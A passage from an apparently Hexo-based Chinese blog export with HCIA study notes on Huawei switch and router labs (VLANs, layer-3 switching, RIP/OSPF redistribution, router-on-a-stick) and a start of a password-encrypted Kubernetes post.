<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># LSW1配置：</span><br><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">vlan b 10 20</span><br><span class="line">int g0/0/2</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">q</span><br><span class="line">int g0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">q</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># LSW2配置：</span><br><span class="line">sys</span><br><span class="line">sys LSW2</span><br><span class="line">vlan b 10 20</span><br><span class="line">int g0/0/2</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">q</span><br><span class="line">int g0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">q</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 </span><br></pre></td></tr></table></figure>

<p>PC1配置（所有的PC只需配ip和子网掩码即可）</p>
<p><img src="/2022/07/17/HCIA/image-20221224164203896.png" alt="image-20221224164203896"></p>
<h3 id="三层交换机基本配置"><a href="#三层交换机基本配置" class="headerlink" title="三层交换机基本配置"></a>三层交换机基本配置</h3><h4 id="一、实验目标-1"><a href="#一、实验目标-1" class="headerlink" title="一、实验目标"></a>一、实验目标</h4><p><strong>1、理解三层交换机的基本原理；</strong></p>
<p><strong>2、掌握三层交换机物理端口开启路由功能的配置方法。</strong></p>
<h4 id="二、实验背景-1"><a href="#二、实验背景-1" class="headerlink" title="二、实验背景"></a>二、实验背景</h4><p><strong>公司现有1台三层交换机，要求你进行测试，该交换机的三层功能是否工作正常。</strong></p>
<h4 id="三、技术原理-1"><a href="#三、技术原理-1" class="headerlink" title="三、技术原理"></a>三、技术原理</h4><p>​	<strong>三层交换机是带有三层路由功能的交换机，也就是这台交换机的端口既有三层路由功能，也具有二层交换功能。三层交换机端口默认为二层口，如果需要启用三层功能就需要在此端口输入undo portswitch命令。如果切换二层交换机可以用portswitch命令。</strong></p>
<h4 id="四、实验设备-1"><a href="#四、实验设备-1" class="headerlink" title="四、实验设备"></a>四、实验设备</h4><p><strong>PC1,PC2</strong></p>
<p><strong>一台S5700交换机</strong></p>
<h4 id="五、实验的步骤和结果-1"><a href="#五、实验的步骤和结果-1" class="headerlink" title="五、实验的步骤和结果"></a>五、实验的步骤和结果</h4><p><strong>讲一下我的设想，PC1和PC2处于不同网段，想要互访必须要经过路由，但是实验只有一个交换机，我们可以使用交换机的三层功能（即套一个路由器，这个路由器是虚拟的，这就是三层路由功能）</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104192525719.png" alt="image-20230104192525719"></p>
<p>交换机配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int vlanif10</span><br><span class="line"> ip add 192.168.1.254 24</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br><span class="line">int vlanif20</span><br><span class="line"> ip add 192.168.2.254 24</span><br></pre></td></tr></table></figure>

<p>PC配置</p>
<p><img src="/2022/07/17/HCIA/image-20230104193842862.png" alt="image-20230104193842862"></p>
<p><img src="/2022/07/17/HCIA/image-20230104193858032.png" alt="image-20230104193858032"></p>
<h3 id="利用三层交换机实现VLAN间路由（有问题。。。）"><a href="#利用三层交换机实现VLAN间路由（有问题。。。）" class="headerlink" title="利用三层交换机实现VLAN间路由（有问题。。。）"></a>利用三层交换机实现VLAN间路由（有问题。。。）</h3><h4 id="一、实验目标-2"><a href="#一、实验目标-2" class="headerlink" title="一、实验目标"></a>一、实验目标</h4><p><strong>1、掌握交换机Tag VLAN的配置；<br>2、掌握三层交换机基本配置方法；<br>3、掌握三层交换机VLAN路由的配置方法；<br>4、通过三层交换机实现VLAN间相互通信。</strong></p>
<h4 id="二、实验背景-2"><a href="#二、实验背景-2" class="headerlink" title="二、实验背景"></a>二、实验背景</h4><p><strong>某企业有两个主要部门，技术部和销售部，分处于不同的办公室，为了安全和便于管理对两个部门的主机进行了VLAN的划分，技术部和销售部分处于不同的VLAN，先由于业务的需求需要销售部和技术部的主机能够相互访问，获得相应的资源，两个部门的交换机通过一台三层交换机进行了连接。</strong></p>
<h4 id="三、技术原理-2"><a href="#三、技术原理-2" class="headerlink" title="三、技术原理"></a>三、技术原理</h4><p>​	<strong>三层交换机具备网络层的功能，实现VLAN相互访问的原理是：利用三层交换机的路由功能，通过识别数据包的IP地址，查找路由表进行选路转发，三层交换机利用直连路由可以实现不同VLAN之间的相互访问。三层交换机给接口配置IP地址。采用SVI（交换虚拟接口）的方式实现VLAN间互连。SVI是指为交换机中的VLAN创建虚拟接口，并且配置IP地址。</strong></p>
<h4 id="四、实验设备-2"><a href="#四、实验设备-2" class="headerlink" title="四、实验设备"></a>四、实验设备</h4><p><strong>PC1,PC2,PC3,PC4</strong></p>
<p><strong>两台S5700交换机</strong></p>
<h4 id="五、实验的步骤和结果-2"><a href="#五、实验的步骤和结果-2" class="headerlink" title="五、实验的步骤和结果"></a>五、实验的步骤和结果</h4><p><img src="/2022/07/17/HCIA/image-20230104211928090.png" alt="image-20230104211928090"></p>
<p><strong>交换机LSW1配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br><span class="line">int g0/0/3</span><br><span class="line"> p l t</span><br><span class="line"> p t a v 10 20</span><br></pre></td></tr></table></figure>

<p><strong>交换机LSW2配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW2</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l t</span><br><span class="line"> p t a v 10 20</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int g0/0/3</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br></pre></td></tr></table></figure>

<p><strong>PC1配置</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104212214169.png" alt="image-20230104212214169"></p>
<p><strong>PC2配置</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104212226789.png" alt="image-20230104212226789"></p>
<p><strong>PC3配置</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104212237237.png" alt="image-20230104212237237"></p>
<p><strong>PC4配置</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104212252180.png" alt="image-20230104212252180"></p>
<p><strong>我发现这实验有问题的。。。可能是我技术不好，这个更改后的配置，更改前的配置如下：</strong></p>
<p><strong>交换机LSW2配置（其他配置不变）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW2</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l t</span><br><span class="line"> p t a v 10 20</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int g0/0/3</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br><span class="line">int vlanif 10 </span><br><span class="line"> ip add 192.168.1.254 24</span><br><span class="line">int vlanif 20</span><br><span class="line"> ip add 192.168.2.254 24</span><br></pre></td></tr></table></figure>

<p><strong>我开启了三层功能会发现vlan全部失效，vlan10可以访问vlan20了。。。无奈之下我只能把vlanif的配置去掉，所以上面的配置ping网关全部都是失联的。。。</strong></p>
<h3 id="路由器综合路由配置"><a href="#路由器综合路由配置" class="headerlink" title="路由器综合路由配置"></a>路由器综合路由配置</h3><h4 id="一、实验目标-3"><a href="#一、实验目标-3" class="headerlink" title="一、实验目标"></a>一、实验目标</h4><p><strong>1.掌握中和路由器的配置方法；</strong></p>
<p><strong>2.掌握查看通过路由重分布学习产生的路由；</strong></p>
<p><strong>3.熟悉广域网线缆的链接方式。</strong></p>
<h4 id="二、实验背景-3"><a href="#二、实验背景-3" class="headerlink" title="二、实验背景"></a>二、实验背景</h4><p><strong>假设某公司通过一台三层交换机连到公司出口路由器 R1上，路由器 R1再和公司外的另一台路由器 R2 连接。三层交换机与 R1 间运行 RIPV2 路由协议，R1与 R2 间运行 OSPF 路由协议。现要做适当配置，实现公司内部主机与公司外部主机之间的相互通信。</strong></p>
<h4 id="三、技术原理-3"><a href="#三、技术原理-3" class="headerlink" title="三、技术原理"></a>三、技术原理</h4><p><strong>为了支持本设备能够运行多个路由协议进程，系统软件提供了路由信息从一个路由进程重分布到另一个路由进程的功能。比如你可以将 OSPF 路由域的路由重新分布后通高 RIP 路由域中，也可以将 RIP 路由域的路由重新分布后通告到OSPE 路由域中。路由的相互重分布可以在所有的 IP路由协议之间进行。要把路由从一个路由域分布到另一个路由域，并且进行控制路由重分布。</strong></p>
<h4 id="四、实验设备-3"><a href="#四、实验设备-3" class="headerlink" title="四、实验设备"></a>四、实验设备</h4><p><strong>S5700交换机一台，AR2220路由器两台，PC两台</strong></p>
<h4 id="五、实验的步骤和结果-3"><a href="#五、实验的步骤和结果-3" class="headerlink" title="五、实验的步骤和结果"></a>五、实验的步骤和结果</h4><p><img src="/2022/07/17/HCIA/image-20230104215057099.png" alt="image-20230104215057099"></p>
<p><strong>交换机LSW1配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">v b 10 20</span><br><span class="line">int g0/0/2</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int vlan 10</span><br><span class="line">ip add 192.168.1.1 24</span><br><span class="line">int g0/0/1</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">int vlan 20</span><br><span class="line">ip add 192.168.2.1 24</span><br><span class="line">rip</span><br><span class="line">version 2</span><br><span class="line">undo summary </span><br><span class="line">network 192.168.1.0</span><br><span class="line">network 192.168.2.0</span><br></pre></td></tr></table></figure>

<p><strong>AR1配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys AR1</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 192.168.2.2 24</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.3.1 24</span><br><span class="line">rip</span><br><span class="line">version 2</span><br><span class="line">undo summary </span><br><span class="line">network 192.168.2.0</span><br><span class="line">ospf 1 router-id 1.1.1.1</span><br><span class="line">area 0</span><br><span class="line">network 192.168.3.0 0.0.0.255</span><br></pre></td></tr></table></figure>

<p><strong>AR1路由重分布配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rip</span><br><span class="line">import-route ospf</span><br><span class="line">q</span><br><span class="line">ospf 1</span><br><span class="line">import-route rip</span><br></pre></td></tr></table></figure>

<p><strong>AR2配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys AR2</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 192.168.3.2 24</span><br><span class="line">int g0/0/0</span><br><span class="line">ip add 192.168.4.1 24</span><br><span class="line">ospf 1 router-id 2.2.2.2</span><br><span class="line">area 0</span><br><span class="line">network 192.168.3.0 0.0.0.255</span><br><span class="line">network 192.168.4.0 0.0.0.255</span><br></pre></td></tr></table></figure>

<p><strong>PC配置</strong></p>
<p><img src="/2022/07/17/HCIA/image-20230104215454559.png" alt="image-20230104215454559"></p>
<p><img src="/2022/07/17/HCIA/image-20230104215509179.png" alt="image-20230104215509179"></p>
<h3 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h3><h4 id="一、实验设备"><a href="#一、实验设备" class="headerlink" title="一、实验设备"></a>一、实验设备</h4><p><strong>PC1,PC2</strong></p>
<p><strong>一台S5700交换机和一台AR2220交换机</strong></p>
<h4 id="二、实验的步骤和结果"><a href="#二、实验的步骤和结果" class="headerlink" title="二、实验的步骤和结果"></a>二、实验的步骤和结果</h4><p><img src="/2022/07/17/HCIA/image-20230101193234867.png" alt="image-20230101193234867"></p>
<p>交换机配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br><span class="line">int g0/0/3</span><br><span class="line"> p l t</span><br><span class="line"> p t a v 10 20</span><br></pre></td></tr></table></figure>

<p>路由器配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys AR1</span><br><span class="line">int g0/0/0.10                  <span class="comment">#创建子接口</span></span><br><span class="line"> ip add 192.168.10.254 24      </span><br><span class="line"> dot1q termination vid 10      <span class="comment">#配置子接口终结的VLAN ID </span></span><br><span class="line"> arp broadcast <span class="built_in">enable</span>          <span class="comment">#开启子接口的arp广播功能</span></span><br><span class="line">int g0/0/0.20</span><br><span class="line"> ip add 192.168.20.254 24</span><br><span class="line"> dot1q termination vid 20</span><br><span class="line"> arp broadcast <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>

<p>PC配置</p>
<p><img src="/2022/07/17/HCIA/image-20230101193316730.png" alt="image-20230101193316730"></p>
<p><img src="/2022/07/17/HCIA/image-20230101193332409.png" alt="image-20230101193332409"></p>
<h3 id="单臂路由转三层交换"><a href="#单臂路由转三层交换" class="headerlink" title="单臂路由转三层交换"></a>单臂路由转三层交换</h3><h4 id="一、实验设备-1"><a href="#一、实验设备-1" class="headerlink" title="一、实验设备"></a>一、实验设备</h4><p><strong>PC1,PC2</strong></p>
<p><strong>一台S5700交换机</strong></p>
<h4 id="二、实验的步骤和结果-1"><a href="#二、实验的步骤和结果-1" class="headerlink" title="二、实验的步骤和结果"></a>二、实验的步骤和结果</h4><p><img src="/2022/07/17/HCIA/image-20230101203109624.png" alt="image-20230101203109624"></p>
<p>交换机配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys</span><br><span class="line">sys LSW1</span><br><span class="line">vlan batch 10 20</span><br><span class="line">int g0/0/1</span><br><span class="line"> p l a</span><br><span class="line"> p d v 10</span><br><span class="line">int g0/0/2</span><br><span class="line"> p l a</span><br><span class="line"> p d v 20</span><br><span class="line">int g0/0/3</span><br><span class="line"> p l t</span><br><span class="line"> p t a v 10 20</span><br><span class="line">int vlanif 10 </span><br><span class="line"> ip add 192.168.10.254 24</span><br><span class="line">int vlanif 20</span><br><span class="line"> ip add 192.168.20.254 24</span><br></pre></td></tr></table></figure>

<p>PC配置</p>
<p><img src="/2022/07/17/HCIA/image-20230101193316730.png" alt="image-20230101193316730"></p>
<p><img src="/2022/07/17/HCIA/image-20230101193332409.png" alt="image-20230101193332409"></p>
]]></content>
      <categories>
        <category>路由交换</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>HUAWEI</tag>
        <tag>HCIA</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes(搁浅)</title>
    <url>/2023/05/14/Kubernetes/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请重新试一下。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="5cf62268922a993a41cf8bf24c8ee4e3d0aafac9eaeed570e38dda51f50b4203">63612e356b8da2492e34c83596341841012f3cdb894a0aa0f3ee3cf8e85b0a02e2089208211a0b8b38965875caf836d6388295dd5aea1491b0ead7e72419fcd530a33cf10504d5331362e6b91f267d3b0022706cebc5894dd4d63c57b76b935c121ffbd06bcad424c906ce80ef0ef62b75538e436672a587aacf83a179575deafbadddbb6389302a8121057f04c54731bcd81c4f55d8ebb1d724084f678939a3ffda648c79b917ad8f4ea5f63d51041540522dffb70ff7ea720e590ee4dd55d76190fcc1e86bbd6aa424aa0f4b99db2a965f6ed9c5050001d06c62711fc32cd33652e9f32b3b219977b04b5377878a1ab964458d38b543db02cc3aff029ef427d0cf49c9061cc2f57f48536e86a05c07615e7cbad86e379b8303b46adb200a354c132b58dd5150d48d05cb7398fdf580b191ce316e24413fb2295d2fabd2b16903865039209abfe479f9284b052eafa752e37babe45d64f63f91bddf4189e2ff33a745e69a928ae37e353441be15bacf37e161d1aebf3f5e31f90d58b5b917653efce6a60a7d686eceefa2ed1ff6089ec15dfd05e4224ce75f1acde2a7af9a673b63d67087eb19d6c7560c15d69b3101032edd6dba5d08f0f655b20a3990ab6a44ae4cc65186297ea5f0b67fd9b87404652a144ce7046f4d61340cff2aba55a183d8d3114b5092bd405d615ea2343ff9e66dd694368021f8bef32e06672fdb77b09fa240a5518c44e7384d85771e1dfba677c02d48aecbe463c6eb8b770dd9f4ecf7661789c95e75c0c8a0db3dae52b2ddbcc7064bb37a602ea4bbc6dbea38546053407e38613cf6fb54fdbba35348b04f7e4fbb72b226b6a6ca93c993f6994dbe79a8ee9fea37fcaecf6f6f7cbc0c2353b60693c5fdce4b95553ac119f6a1fb052e5126aefaa8f30ece739b1dc4f5cb8cdcc77a04fc543cafdc2dfeb06143e91bbebf46e23209e7906c74e450b8a60c2516be18494290219fe90a542796f3a3a59a145d0ce32949a884eb6ebc3b2a2d7d70b5327b3473abf606a707edabdf4232b4dcafe8bf97ec6f531ec69150bae9f371b6a8b4c97ee31c925d81df79f6b5b8c7948a57950d43565ec8a05ab23b3ac5a21e4cb76429bb0b3044bbce8546971a2b01dc4f95cac76ea08e2c8bfdf275f2fa818b398468abd80f7d5fb5429ffa589213d309cb3bb258f0757fd10b5167d87327c9d3cc11d0cefdb0b3673d18d9b209740ad8814d1925657589531fa4f5fa4b6e83820d2bf64fab2111d3fd9d949443f7fb3dea79bcfff341168728ef171151e8ac839ca5b51fcc2cedbb3cc723b29b2a7dd512a9bef9bdb8e202fad2d370ef32216184a46eb9fdf17872edc245466e82a1cd45baf7e91fac81386b9b5668b743363423a9e40ef468ac1b893e6107cacbb80227d999da25771c5dcfbf1756ac82df57196e7bdf9b5b61d1a7c7d4d926d9d565d4647d711f38735f8607ccd8bed8b83592f0ff93b158303eb721ce912aff4e231ea123caf2b4e5bc715e4b3f4ff21fb3e6adbd70464747e03d50acb4e501172224d713ec2216b6b8094ed97bce15b32f972a94f0dc4cea877edf9b25c12ef8d6e18b4eec5f42b1aec1803d3d016a591fa6d6fb62f37a0b4012fb5235e73ba66a30cfde7a9c0449cf6b2827f35caf993e05749e431780dccfe39dac04eed74f9825aeb204b6f25f4ff07e9615577093c4cedb8c90f86b606107795009a99ec2c56a086a094155d5b9ad79ab3e2119faf9bd206cd3627b3c09724425f958abf4851d1396f86247faf56401917a60476a0236023bae3fe88559bec3a2e504557b0ebba5c8b0df4906e9e266e4dd711ce9e1d056378a3d7b9c9471c3a27c732321f5c106171673899191e29ac3a4bd1dcd07984276793237dfc35f184d765f27bc8ecd766bd44ca1436311146b62a651f2aae7e258a4fe5d13c0494021697d98f6e1075eff72185467e5833294fb77b0f6de4ec20bd3f14554bc69fee1370a8eea4a43a1c61b95d8d16aa6b476279e1aab177cacd3e7856a4ea80605cb975ce9c4f3598fd0cfc833cbde654c0bcf222b646c59ff1d2e6e3cdddeb6704695f77c0533b99aa3be7e1ac4e57b2317491ff76283bbe97fa6b8fea10508df2d94d9bf1445c4c8c59cd5334dcde6cd150e6aaac9005fcfaa4f43f53e4b5913718f35d5c5f4927a75646f6c650052667026422e1988b1b20ce0e49d605abe410f6a8e3511249ff3c150af8c7c126c1bf1e2837638c9809451ccbbafb73c5ee202477a978113f72c068a5ff0da07497bb6a0bccf914220f0ac6deb3ff84edaab46b35800cef70f00e73a16e916e1df3c1235aa35df2b4266c5a58ae2b46ac400a3b7f8f51a7080139cbff53296925d72c4b624ac2305dce3bff0e78b030bd1b7b590d11bf47b8d8ef9f64cf42a6693c892449e54d7c7a54a83adc2d5f85b9417ce9c88dd8471dc0752847bc0cc46ce9ab8e5eb69ab66dec6407570dea9ab971987580b2c51a82425f7da25f040c902c9c5a6af2d714731fc8932b7af0f3928c2f06b7a1999f21966c542abe978f8f9120140ed98709d0dc91b3a071325f1f693f5b96580d4824a68e3fff3cc456cafc3c0297de30f0be2a2d2cbacda0a15a1333f64e13035bb10087840b6459440e1d3718baf2e4f760684a7d95b3ad5bde380da96328d8b0bf79fef5229a0c7113c6364ee7825d78d89aef9cbadb7f7684cbf497be36da6e4624618b69b7a5f0f823bf583efabdd1dee2c36818db02e2b64772e890104ac2659cfa0ce9229852b6a735b0ce8ea9b75186790daa160fc7f7c8c2e19707e8230e3c3cd4b30cf864d7d349a1c0540a5642c2f67a5de597d3cd985a1871e6fadc6b6e21184fe2627e346904e8e27c967890360cfcd7167f10ca51920cf2a98a397f0f7591682ab3e523e1323ce06f42e8d6b5feb9b92156cab9bed3e25e062594bf10a4542ad78852daf15517250f25d427d67c779301c3d37535eb2b337de17e0314e6edd88f2d9eea5a14618fdf23aa194dee838fb47e3e212c983883137b992ff35b799e3ddda1eb1ea679f3d6dc21e50a781e4d37bf8beb1d7a0a66458a843223e01020d888fa9b0d5bdefe814653cdb6176d6f94c5f56b6171644a9de3f91e32d1fa09a6d7321ecefb2e01a4df39ea19d2f56d3a1ace7207ae609e6b00981d2ebb7b49a68e94c217391ed01bce1b8667fab234053aa488fe56a77f440cd06235e18ee54649bc691d06e6e30e0ac85e7e717831725972770b41c628ebd7d3d3d5907e9402abcaaf82d1ba31fb1abc51b1c44d53ae1b473a05978ccf92cf8c2b0c3088dcfc0ccef07014aa90a6f7d7091a6d5ed391a31d14357b0bd810790384211a86a6485beba97d806242cf93ca706f2ba8dd770fbcb52b5c5ac79a4bf76b68e6027113d07aa6c0dbba202736d95de50936caafaf14f2b6a8a3893533d00b192eeef082a411194103e20982b82e64bcb4167faa836dfeedf6a19fbff68d1d37c4a0f42c785cfdd84c484e1ac828b91d09d865e17592d264c1a7d851b6ee92c7ae1256cfbe0873b0ba137623c9323509e0ae6a3d2ef2735ad841dee546294ce7137d9a39dff8f61954337cbaa6a5ba2216670446c11d2e67b9704f224e29f8f811a8a6f15063b03e5a289dcb0b40a45f892c85f93c16c6c639c2a8074c32f5796f8f5cbfbcaa4c7ca07911e520fb4af20c19d4268dc442695e9d11445df0ecdaab62017a77ea227f9aa92a7a4814436727f09f2c9fb6ae48a42a7cc8b4a772b380f215c78977534e9ea1005c035a98c63541a60e0c8c62cf4ea8943abd797a70d1a203356231a3585baa223683c4b5b6d1a598f5c9c3994e4028979ed15c259d9c596749461a5d751129263d46b2aa5fbba18024ed0f1efe79c8ee3d5243cc403bbd6eb4897ca01dfe78bf0a1742682705d886bee68a2f00ac7d6d7a6b081bee1710aeb644ff76d143bca570eac4ac3410b1ed534a4049d74a867e2d280bf5dd9fe2360efa07899471bb1072c5ba0f6ecb3e8b6db48821c25402c554c5527dff5aae3de502375543c771bf1e149ad9f6588ee00a41e667ebc0aa3647e186a1172ef31269b7fbbe63f82b3ce928bf77068b6c6b4ef770295bb06d147c248c41c1580f8011f61fd3bd24d58fc5d5aee401fc435c53e992504f17e80a4f88c95528994b734d45354f3f122cfd5324f032b3b754bb6f48c1db9deccdc417095c00b5ba5d39c854afc0fb9be061c6aaf4d9a5f4a0368d50a863de4f52546c85738ea076439560c39414f7371d0307ecfb7a8a68ef5d3ecfcbd72a6bf79f5f6b9958147ebd85f297aaef1f9e09948f152aa2c0b6a8445952a19f83705e9de45a426a425921d48b89b7320b6ba2a1a63b5753a8a6d934fd7e0b85394a372ba97a598d31bc2edcc7ae378e8de9d65d0a5922e6094e8fbc1bf5dd708f93e80b393ce257b3768a4c142c9be1e23058e6445af550d0f7520564f3725b50aac528de4c5d96f6cf2711a9ea19bcc299fa6af9f0b26f6ea18d4f02ebeed259901a17c99999fdb7c165166c6e54cc3b62b87ed383f40399571d15f881606c5d87bd215ee380fa3271b7f7e4544349b0cd42de24ad9c1ae5ae12b0f1dccc3b4fbde5397f71bbf8c42cc16d282f3b45b068c7c3aaba577f58a36f5b7d9fbb96ab0a164fd710641f0e1e0cfecf3c131b8f8c1b020baef69dac54590bb10494cff6257e8ba9174480605005196d2217681293761d194749b17841a29ff5d8a91836e3ada2e38924374b3fc1fb7d8a9705019bcfc2a98878fd53792f75d0adce7a6e2af27308c57edc4d1c7d16d7c4522dfc9c62e210acee890b4103d776cae891d62639ef43482e1e3ef66c8a75dc857b677a8f0ee884fbbe25ce5cf241064c926bada3b795a6ee6e164aae48675957ddcee1877ffd4557b6cf1d3a6cfeea8bf7666d3f3afa4636372ebc2d4ea73ca947b67d692639ed52aabd9cb57dd148bca404fc62e5dd43af363238532b7de4f35355cdfc840225c6f6bd463236aaf15ee05e2f7da4d679026ddfc8cfd2a5d5abd53e7ca86663621857b3fe791e7bfa9920625cd46cece66875aab83fbf846fd76c833e268fa43d52aa7664917597040d1f469c7a4afc49ccb3f3f3af6918b6e18dfaf3a976b128ea0470edb8553f251d25ab53c887ded4d4947dce5aefc2657aa664d39b560de2d923585e5b5c3ad23fe86a41de18ecea90c9a18ad72179fe04845a09c9cf671559422a5422d083a74a6ae1231dedc1e47e6aa9783477fc0bd7f8cca96c1a9a4cd5a1fb1905d4625be82d7a23cac7a4174e0696c8785ff5f5865ec7e5122e1313c88d09a29c80b71efa839a987a4d2410e14d8f7f203b7eb00ac9eeecd0160491cd6d42ee22a4635874558d07ea545be12e3d5f4c23000d45bb7d13d0c00737912141e3fe4aa66e01c1cf576653662a4a41f499e6da6bd8eda585e5005ed7f02d7d813befcdbc03f2d2dab5637e236c8d5846bfac9dd8d8d492103e85bd3cafa8abdad6e80039c112d5fd0b5a8979c5d945221582a3a2723768e1d1a14492f4758b2e5a847ea2701bc921bf7864105d969d068a17e9b10fdcc3580d8c346a9f51dba2f3552c008ff6ffdaa5a47b98201a9ab6ae7fefc08fc6032d4b9790fe9d86152580a4e30ed16ba918ac663cb7f1005986b78bb1f13344e964bdc547960725ff7660aa1f717d07e8e9b6c94e0d8eadbe1102ceea03d210e0e65a8fe44606bc324e1eb39ba8a73f1f6e10c9152d4b324b3416dba9a208032655a049f7b6ceb91076198111b98218f0183e839ed53da17271694fa731852720666560f745f9707e9e3f14f15f5375aa180d7c466cd0acdee34a741b62ca651aa6f24feb46c3d2f7c4f3d8bade6075d6f904ac2f0415d65f31e05afd2f8de47cc9401bde4aed911cb09a4733df1b401fc4d26369e373b96214021e3d7ca8eb4973ef5460b0fdc2eb2ff1585025828fb4aeef013ae3b4427dade86d1862f109224f414072d0b8ff70e8840725685bb89dda2e528808029c4746063239b7c014918fdcfb459b2ec43c65da4829ef1f4404d9891a91064b3f82a693479e9a922b7468dadbe73b3507399ba38d3b5a11dca19541d3db1d87d25dc057671f3d5902b117f08a23e678b5d4e30651eac3e6941b09a22513e40aa83b6bda16ae91e340e19b8b6a87f07fa0386146629646e9ead09bea1ba8119f0b01b6ac013d702cc758c246d1a27dc1fc50942bc370eb0ea3d3171758d0e45d4f961714b857672a39b5fa53fb6d4a8e9480180e1fc77cc7f031514469fdabe4d5dd5be80d9e72ba527abb91ab0489b27f55b7d5710e7a2296f1f4b1511e78b3220423426a56b453568d862cba50a7a5051132e9ae1c5c844848c6edd85a6c4b48e6d572c74b3bbc15f3ed82783e22f1333d0e05515a11b06860e0520513af76e9114263edeace70d4927f0765e66d18cef6a1913e5dc4332fee408dfaf810de62ce8675a88a38b01c430f6f5d1241169c8eacb3bdfcc163a274fabc669f982e219dff576e1ebd3c4ced53ea88ccae7ac54179654247b08bad10a7d0616507447fbeaf3382efba3f41c18cd2155e7debb01258b2602aee4d26ea450d287cd3e05769350967e1b2875c68097301fb803813afb6394326064bac4b28eadfac7d0bf2ccf32eaff95945148ef5e4cd194b5d0227792df140bd423aeeee8eeac31a0122d3c4382f382fd8f666d9c17630d8bb199d27c0983691ead87546e6af82ebcaacf4385e3a6d8d2605ee86d6ab7b73106b52dbfc5067338f9b95da4e0db2b04f4ee207a8532f0cedb8799e1965d62c4c14e80a91e898fb0cedcc831130e079f53d4912c0d1de9f1663dd7fb248b6ae0cb2495a4d863c263d2d580730ec864d52d48567a488b9f4ddad6e03eca1a457847ed3768202d2e1c4c2c78a7c71d9853f095689f0521200229a8cdf85698032d3a54a64a5967e6ed58327d1ed5a69eb2f2ce47a4cf448e12a2b42a7efdd620e708a6be7adf5ee138d6b50c40ae06c0879f03e230c1432e3ea1c8b67641b02c72ea3afdb3ef3e729356f6e8b4f105ab4ac5b48daaa0df7a01f87c55685447c8a951096f82e5ed9c0a7879e59ad8278eae7ae8012be7af089b769c83c510e52bded2fe1259b6f216225d5b9e3ab7a117b3b3cfedf439398d89ca164a375ec1fc732fc9204dbd81f0f249abb5e33e40ff788cbc323ca4879c9274f0d63075786b0fa09387dcc907009e7d7eec47c8f90fa25e63d705af76427dba061a207e620b46188ff5d389b1788eb4b596a32883e85ec856f8fd7e96f5cb403bf071f6f7ceefe92f8932b642a675a593a608459bb03afe6a482531f5d94a278cc174553a623d335bd5ca77face57258b8266fb81272c94a28fafbf3df621dd7ecc4c7911419d9f7f7cd577e442c956f4101c3a92aba5514f6be62a90f7e2375413fbc949cfc6a80ed65c317271852049c161fa28cba730282580e463a89cb7359b6c70ad11b06f